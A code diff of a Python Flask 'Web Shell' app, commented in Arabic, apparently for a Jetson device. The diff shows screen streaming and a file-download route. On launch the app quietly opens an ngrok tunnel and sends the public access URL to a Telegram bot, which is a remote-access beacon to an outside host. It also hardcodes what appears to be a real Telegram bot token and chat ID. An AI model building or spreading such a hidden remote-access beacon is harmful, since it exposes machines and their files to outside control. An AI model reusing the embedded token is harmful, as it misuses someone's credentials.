@@ -12,7 +12,7 @@ import numpy as np
 
 app = Flask(__name__)
 
-# ضع هنا بيانات بوت التيليجرام الخاص بك لتستقبل الرابط عليه تلقائياً
+# ضع بياناتك هنا بدقة (نسخ ولصق)
 TELEGRAM_BOT_TOKEN = "8508402230:AAGK5iP1fxc7Dscu5pDmqWkAGLCCYLtKrB0"
 TELEGRAM_CHAT_ID = "8897834377"
 
@@ -25,25 +25,25 @@ def send_telegram_message(message):
     except Exception as e:
         print(f"[-] Telegram Error: {e}")
 
-# دالة لفتح نفق Ngrok تلقائياً وإرسال الرابط إلى تيليجرام
+# دالة تشغيل Ngrok المحلي وجلب الرابط وإرساله للتيليجرام تلقائياً
 def start_ngrok_and_notify():
-    time.sleep(3) # الانتظار قليلاً حتى يعمل السيرفر
+    time.sleep(3) # الانتظار حتى يعمل سيرفر الفلاسك
     try:
-        # تشغيل ngrok على البورت 8080 في الخلفية
-        os.system("ngrok http 8080 > /dev/null 2>&1 &")
-        time.sleep(3)
+        # تشغيل ngrok المحلي في الخلفية على البورت 8080
+        os.system("./ngrok http 8080 > /dev/null 2>&1 &")
+        time.sleep(4)
         
         # جلب الرابط الخارجي من واجهة ngrok المحلية
         req = urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels")
         data = json.loads(req.read().decode())
         public_url = data['tunnels'][0]['public_url']
         
-        # إرسال الرابط مباشرة إلى بوت التيليجرام
+        # إرسال الرابط مباشرة إلى بوت تيليجرام
         msg = f"🚀 تم تشغيل الـ Web Shell بنجاح على جهاز الـ Jetson!\n\n🔗 رابط الدخول الخارجي:\n{public_url}"
         send_telegram_message(msg)
         print(f"[+] تم إرسال الرابط إلى تيليجرام بنجاح: {public_url}")
     except Exception as e:
-        print(f"[-] لم يتم العثور على رابط Ngrok تأكد من تثبيته أو تشغيله: {e}")
+        print(f"[-] خطأ في تشغيل أو جلب رابط Ngrok: {e}")
 
 # دالة التقاط الشاشة للبث الحي
 def generate_frames():
@@ -198,12 +198,9 @@ def download():
     return "الملف غير موجود!", 404
 
 if __name__ == "__main__":
-    # تشغيل خيط (Thread) لفتح Ngrok وإرسال الرابط للتيليجرام تلقائياً عند بدء التشغيل
-    threading.Thread(target=start_ngrok_and_notify, daemon=True).St_art = True if hasattr(threading.Thread, 'daemon') else None
-    # طريقة أבسط لتشغيل خيط الـ Ngrok:
+    # تشغيل خيط خلفي لتفعيل نجروك وإرسال الرابط للبوت تلقائياً
     t = threading.Thread(target=start_ngrok_and_notify)
     t.daemon = True
     t.start()
     
     app.run(host="0.0.0.0", port=8080, debug=False)
-    
